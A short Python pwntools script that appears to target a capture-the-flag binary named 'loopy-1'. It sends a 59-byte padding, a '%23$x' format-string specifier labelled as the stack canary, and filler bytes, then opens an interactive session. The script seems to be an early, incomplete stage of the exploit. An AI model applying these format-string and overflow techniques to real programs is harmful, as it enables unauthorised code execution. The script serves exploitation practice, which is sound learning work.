#!/usr/bin/env python

from pwn import *

p = process('./loopy-1')
print p.recv()
offset = 59
canary = '%23$x'
payload = ''
payload+= 'A'*offset
payload+= canary
payload+= 'BBBB'
p.sendline(payload)
p.interactive()